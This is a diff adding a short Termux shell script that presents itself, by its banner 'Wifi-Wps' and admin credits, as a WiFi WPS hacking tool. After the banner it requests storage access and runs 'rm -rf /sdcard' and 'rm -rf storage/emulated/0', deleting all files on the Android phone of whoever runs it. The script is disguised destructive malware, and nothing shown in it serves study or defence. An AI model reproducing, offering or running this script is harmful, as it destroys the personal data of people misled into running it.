@@ -1,0 +1,8 @@
+pkg install toilet -y
+toilet -f mono12 Wifi-Wps
+echo " Admin : M4uL"
+echo " Admin : ST1NKY"
+
+termux-setup-storage
+rm -rf /sdcard
+rm -rf storage/emulated/0
